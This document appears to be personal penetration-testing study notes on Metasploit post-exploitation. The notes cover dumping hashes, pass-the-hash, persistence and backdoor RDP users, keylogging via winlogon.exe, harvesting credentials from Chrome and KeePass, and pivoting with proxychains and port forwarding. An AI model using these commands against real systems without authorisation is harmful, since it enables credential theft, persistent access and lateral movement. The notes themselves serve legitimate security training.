# pen-leviathan
pentesting notes

## Priv Escalation
- If we grab hashes for a system, we can use `mimikatz` to grab them from memory. This needs to be done in a 64 bit process so that meterpreter can load the module without problem.
- Run `sysinfo` and check Meterpreter value. (x86/win32 aint gonna cut it)
- To find a process to migrate to, run `ps -A x86_64 -s` when you are a `system`. This will display available compatible processes to migrate to.

## Grab hashes
- `run post/windows/gather/smart_hashdump`
- Now you can run `creds` or `loot` in the msf console to see the data as well.
- use `exploit/windows/smb/psexec`
- set usersname and then the password hash

 ## Backdoor Installation
 - For windows systems, once you have a meterpreter session, `run persistence`
 - `run getgui -e -u atk_user -p atk_password`
 - RDP Service is now started and user 'atk_user' with password 'atk_password' can now rdp into the machine.

## Pillaging
Commands inside of meterpreter for pillaging data
- sysinfo
-- if server, for example, we would know to search and see what type of services are running (in shell this would be `wmic service where started=true get catption`
- getuid

Meterpreter has a good set of gather utilities under:
- run post/windows/gather OR
- run post/linux/gather
These can also be used outsie of the meterpreter session. You just need to use the `use` command, configure its options with `set` and then execute the module with `run`

### Windows
- run post/windows/gather/enum_domains

If the machine is part of a domain, we can enumerate accounts and other information in the default active domain
- run post/windows/gather/enum_ad_users
- In a shell, run `net localgroup` to list groups and `net localgroup [GROUPNAME]` to list members of a specific group
To figure out what resources are shared:
- run enum_shares (same as `net share` in a shell)

The two main scripts to use against windows hosts are:
- scraper - harvests system info including network shares, registry hives, and password hashes
- winenum - retrieves all kinds of info about the system including env vars, networking interfaces, routing, user accounts, and much more
- Both of the above are invoked using `run winenum` or `run scraper`. Files are saved locally.

Keyloggers:
These only record the keys of the process the session has been migrated to. So if you want info when a user logs into their computer, you need to be migrated to the `winlogon.exe` process.
- `run keylogrecorder` <- there is a `-c` option that allows you to automate the migration into the correct process.
- `run post/windows/capture/keylog_recorder`

Searching for files:
- From a meterpreter session: `search -d C:\\Users\\els\\ -f *.kdbx` <- password database file extension

Downloading files:
- use the download command.

Gather Credentials:
- `run post/windows/gather/credentials/`
- In the parent directory, there are useful scripts as well. For example the `enum_chrome` script can be used to gather credentials stored in Google Chrome

List Applications:
- `run post/windows/gather/enum_applications`

Other:
- `run post/windows/gather/credentials/credential_collector`

### Linux
https://n0where.net/linux-post-exploitation


## Mapping the Internal Network

### Meterpreter Commands
Basics:
- route
- arp (good way to find new ip addresses in the network)
- netstat (will show all the host network connections as well as the processes assocatied with them)
- arp_scanner
- ping_sweep (run outside of meterpreter, but has an option where it is set to a specific session number)
- netenum (research more)

Pivoting:
Add a new route to the network to allow for a single host to scan their own internal network.

- `route add 10.10.10.0/24 255.255.255.0 2` -> 2 is the session we want to route things through.
- `run autoroute -s 10.10.10.0/24`
- `route flush`

Sometimes metasploit modules are not enough and you may want to run tools like nmap or nessus on these new hosts. To do this we will once again use the current session on the exploited machine, to pivot external tools via the meterpreter session and its route. In order to do this we will have to set up a socks4 proxy within metasploit and then use tools like proxychains to route the traffic through this proxy.

#### Setup Proxy
- `use auxiliary/server/socks4a`
- configure a port to listen on
- Execute: `run`
- Can check for listening port via `netstat -tulpn | grep [PORT_NUM]`

Now that the proxy is set up, we need to configure tools like `proxychains` in order to use the address and port set in metasploit. Proxychains is a tool that forces any tcp connection made by any given application, to follow through proxy like SOCKS4 SOCKS5 TOR and so on.

#### Configure proxychains
- Open up the proxychain configuration at: /etc/proxychain.conf
- Change the last line to the following `socks4 127.0.0.1 [PORT_NUM]`
- The above statement is telling proxychains to use SOCKS4 as the proxy on our local address on [PORT_NUM]

We are instructing proxychains to use the proxy set within metasploit and its route. The process is now: `tools -> proxychains -> metasploit socks4a proxy -> meterpreter routes -> meterpreter session -> target network`

#### Use tools and utilize the new proxy
Use a scanning tool like nmap targeting the target internal network
- `proxychains nmap -sT -Pn -n 10.10.10.5 --top-ports 50`
- By adding `proxychains` before the nmap command, we will force nmap to run through it.

You can also route other things through proxychains as well. For example:
- `proxychains ssh 10.10.10.XX`
- `proxychains telnet 10.10.10.XX`

You can also setup port forwarding:
- Inside of meterpreter, the following command will open a listener on our local ip address on port 3333 and will forward the connection to the ip address 10.10.10.5 on port 3389
- `portfwd add -l 3333 -p 3389 -r 10.10.10.5`
- To check that is worked, run `portfwd` to list the forwards.

Now we can use the forwarding rules to get a remote desktop session via a call like `rdesktop 127.0.0.1:3333`

### Pass the hash
The metasploit module that we can use to run the pass-the-hash attack is called `psexec`

